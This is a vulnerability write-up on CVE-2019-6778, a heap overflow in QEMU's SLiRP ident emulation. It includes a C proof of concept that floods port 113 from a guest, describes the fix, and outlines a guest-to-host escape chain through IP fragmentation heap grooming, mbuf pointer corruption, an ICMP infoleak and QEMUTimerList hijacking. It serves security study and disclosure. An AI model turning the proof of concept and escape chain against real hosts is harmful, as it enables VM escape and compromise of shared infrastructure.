## Vulnerability causes and details

This vulnerability exists in QEMU's network module SLiRP. The SLiRP module mainly simulates the network application layer protocol, including IP protocol (v4 and v6), DHCP protocol, ARP protocol, etc. There is an [old version source code] on sourceforge (https://sourceforge.net/projects/slirp /files/#files), the slirp code in the QEMU source code is very similar to the one here, maybe it was developed based on it? It is worth noting that the slirp module has not been modified for a long time, but it is the default network module in QEMU, so its security is worth studying.

When simulating the tcp protocol, several special ports are specially processed in slirp, including ports 113(*Identification protocol*), 21(*ftp*), 544(*kshell*), 6667 6668(*IRC* )... When dealing with these special ports, user data needs to be manipulated, and problems may arise if you are not careful. **CVE-2019-6778** is the heap overflow caused by directly copying user data without verifying whether the remaining buffer space is sufficient when slirp processes the tcp request on port 113.

```C
// slirp/tcp_subr.c:tcp_emu
case EMU_IDENT:
/*
* Identification protocol as per rfc-1413
*/

{
struct socket *tmpso;
struct sockaddr_in addr;
socklen_t addrlen = sizeof(struct sockaddr_in);
struct sbuf *so_rcv = &so->so_rcv;

memcpy(so_rcv->sb_wptr, m->m_data, m->m_len); // copy user data to sbuf
so_rcv->sb_wptr += m->m_len;
so_rcv->sb_rptr += m->m_len;
m->m_data[m->m_len] = 0; /* NULL terminate */
if (strchr(m->m_data, '\r') || strchr(m->m_data, '\n')) {
...
}
m_free(m);
return 0;
}
```

There are two important data structures in the slirp module, one is mbuf, the other is sbuf, mbuf is a structure for storing data passed in by users from the ip layer, and sbuf is a structure for storing data in the tcp layer. Their definitions are as follows:

```c
// slirp/mbuf.h
struct mbuf {
/* XXX should union some of these! */
/* header at beginning of each mbuf: */
struct mbuf *m_next; /* Linked list of mbufs */
struct mbuf *m_prev;
struct mbuf *m_nextpkt; /* Next packet in queue/record */
struct mbuf *m_prevpkt; /* Flags aren't used in the output queue */
int m_flags; /* Misc flags */
int m_size; /* Size of mbuf, from m_dat or m_ext */
struct socket *m_so;
caddr_t m_data; /* Current location of data */
int m_len; /* Amount of data in this mbuf, from m_data */
Slirp *slirp;
bool resolution_requested;
uint64_t expiration_date;
char *m_ext;
/* start of dynamic buffer area, must be last element */
char m_dat[];
};
```

```c
// slirp/sbuf.h
struct sbuf {
uint32_t sb_cc; /* actual chars in buffer */
uint32_t sb_datalen; /* Length of data */
char *sb_wptr; /* write pointer. points to where the next
* bytes should be written in the sbuf */
char *sb_rptr; /* read pointer. points to where the next
* byte should be read from the sbuf */
char *sb_data; /* Actual data */
};
```

It can be seen that when simulating the ident protocol, the program copies the user data in mbuf to sbuf, and at the same time adds the number of copied bytes to sb_wptr and sb_rptr, but here the program does not perform any operations on sb_cc. Verification of a layer function,

```c
// slirp/sbuf.h
#define sbspace(sb) ((sb)->sb_datalen - (sb)->sb_cc)

// slirp/tcp_input.c:tcp_input
     } else if (ti->ti_ack == tp->snd_una &&
tcpfrag_list_empty(tp) &&
ti->ti_len <= sbspace(&so->so_rcv)) { // here to verify whether there is enough space in sbuf
...
if (so->so_emu) {
if (tcp_emu(so,m)) sbappend(so, m);
```

Before calling tcp_emu, it will verify whether the remaining space in sbuf is sufficient, but because the data is copied but the corresponding length is not added to sb_cc when simulating the ident protocol, the space calculated by sbspace is not the actual remaining space of sbuf .

So if the user keeps sending data to port 113, it will cause overflow in sbuf.

The poc is as follows:

```c
// poc.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
     int s, ret;
     struct sockaddr_in ip_addr;
     char buf[0x500];

     s = socket(AF_INET, SOCK_STREAM, 0);
     ip_addr.sin_family = AF_INET;
     ip_addr.sin_addr.s_addr = inet_addr("10.0.2.2"); // host IP
     ip_addr.sin_port = htons(113); // vulnerable port
     ret = connect(s, (struct sockaddr *)&ip_addr, sizeof(struct sockaddr_in));
     memset(buf, 'A', 0x500);
     while(1) {
         write(s, buf, 0x500);
     }
     return 0;
}
```

Run `sudo nc -lvv 113` in the host, and then run poc in the guest. Note that it is not necessary to connect to the host here, as long as any IP that the guest can connect to is fine.

## CVE-2019-6778 vulnerability fix

![1](./assets/1.png)

The bug fix is simple, verify that there is enough space left in sbuf before copying data.

## Exploitation

Since the place where the overflow occurs is a pure buffer, the data before and after it is unstable in actual operation, so an appropriate means is needed to control the heap.

### Malloc Primitive

##### IP fragmentation (IP fragmentation)

> **IP fragmentation** is an [Internet Protocol](https://en.wikipedia.org/wiki/Internet_Protocol) (IP) process that breaks [packets](https://en.wikipedia.org/wiki/ Network_packet) into smaller pieces (fragments), so that the resulting pieces can pass through a link with a smaller [maximum transmission unit](https://en.wikipedia.org/wiki/Maximum_transmission_unit)(MTU) than the original packet size . The fragments are reassembled by the receiving [host](https://en.wikipedia.org/wiki/Host_(network)).

![2](./assets/2.png)

In IPv4, IP fragmentation exists to transmit data between two networks with different mtus. If a larger packet wants to be transmitted to a network with a smaller mtu, then the packet needs to be fragmented before sending. There are special fields in the IP header to meet this requirement.

- Zero (1 bit), which is 0 and not used.
- Do not fragment flag (1 bit), indicating whether the packet is fragmented.
- More fragments following flag (1 bit), indicating whether there is a follow-up packet, that is, whether this packet is the last one in the sequence of fragments.
- Fragmentation offset (13 bits), indicating the offset of the packet data during reassembly.

##### Implementation of IP Fragmentation in qemu

```c
void ip_input(struct mbuf *m)
{
   ...
/*
* If offset or IP_MF are set, must reassemble.
* Otherwise, nothing need be done.
* (We could look in the reassembly queue to see
* if the packet was previously fragmented,
* but it's not worth the time; just let them time out.)
*
* XXX This should fail, don't fragment yet
*/
if (ip->ip_off &~ IP_DF) {
...
/*
* If datagram marked as having more fragments
* or if this is not the first fragment,
* attempt reassembly; if it succeeds, proceed.
*/
if (ip->ip_tos & 1 || ip->ip_off) {
ip = ip_reass(slirp, ip, fp);
       if (ip == NULL)
return; // return directly here
m = dtom(slirp, ip);
} else
...
}
```

When trying to reassemble an ip packet, if the reassembly function returns NULL, it means that the current fragmentation sequence is not over, so this packet will not be processed by the next process, but will be returned directly!

This means that we can arbitrarily allocate IP packets (that is, mbuf) in memory, which will be a very good malloc primitive (primitive).

### Arbitrary write

As mentioned earlier, the data structure used to process data at the IP layer is mbuf, and the m_data field in mbuf is a pointer to the actual data, which is a very good overflow object.

In IP fragmentation, when the MF bit of a packet is set to 1, qemu will assemble the previously stored packets

```c
// slirp/ip_input.c:ip_reass
   while (q != (struct ipasfrag*)&fp->frag_link) {
struct mbuf *t = dtom(slirp, q);
q = (struct ipasfrag *) q->ipf_next;
m_cat(m, t);
}

// slirp/mbuf.c:m_cat
void m_cat(struct mbuf *m, struct mbuf *n)
{
/*
* If there's no room, realloc
*/
if (M_FREEROOM(m) < n->m_len)
m_inc(m, m->m_len + n->m_len);
memcpy(m->m_data+m->m_len, n->m_data, n->m_len);
m->m_len += n->m_len;
m_free(n);
}
```

In ip_reass, the linked list storing the IP sequence will be traversed, and all subsequent packets m_cat will be put into the first packet, and the data in the second mbuf will be copied to the first mbuf in m_cat. Note that memcpy calculates the target address based on m_data and m_len, **overflowing this structure will give us the ability to write to any address**.

### Infoleak

The premise of wanting to write to any address is that we need a leak. The good news is that since the number of bytes overflowed is in our control, we can modify the lower bits of the address. The leak's plan would then be:

1. The overflow modifies the low bits of m_data, and writes a fake ICMP packet header in front of the heap.
2. Send an ICMP request with the MF bit set (1).
3. The second overflow modifies the low bits of m_data in the second step to the forged header address.
4. Send a packet with the MF bit set to 0 to end the ICMP request.
5. Receive a gift from the host.

~~ Here is a question for readers. When returning ICMP echo reply, qemu will check the checksum of the ICMP header. How to solve it here? ~~

This completes infoleak, and we can get the base address of qemu-system and the heap base address used by slirp.

### Control PC

Now the problem is transformed into, how to use arbitrary address to write the control of program execution flow when the base address is known?

Some failed attempts:

- The got table cannot be written, and the modern protection methods of the qemu program are fully enabled.
- Look for function pointers in the heap, can find some, but addresses are unstable and hard to trigger.
- There is no structure containing function pointers in the slirp module.
- Other modules have function pointers, such as the structure of the e1000 network card, but they are not in the same heap as the slirp module.
-...

Finally, we found our target object: QEMUTimerList on the global segment.

```c
// util/qemu-timer.c
struct QEMUTimerList {
     QEMUClock *clock;
     QemuMutex active_timers_lock;
     QEMUTimer *active_timers;
     QLIST_ENTRY(QEMUTimerList) list;
     QEMUTimerListNotifyCB *notify_cb;
     void *notify_opaque;

     /* lightweight method to mark the end of timerlist's running */
     QemuEvent timers_done_ev;
};

// include/qemu/timer.h
struct QEMUTimer {
     int64_t expire_time; /* in nanoseconds */
     QEMUTimerList *timer_list;
     QEMUTimerCB *cb; // function pointer
     void *opaque; // parameters
     QEMUTimer *next;
     int attributes;
     int scale;
};
```

In QEMUTimer, after the expire_time time is up, cb(opaque) will be executed.

The main_loop_tlg on the global bss segment is an array of QEMUTimerList, forge a QEMUTimerList in the heap, cover its address to the global main_loop_tlg, PC controlled!
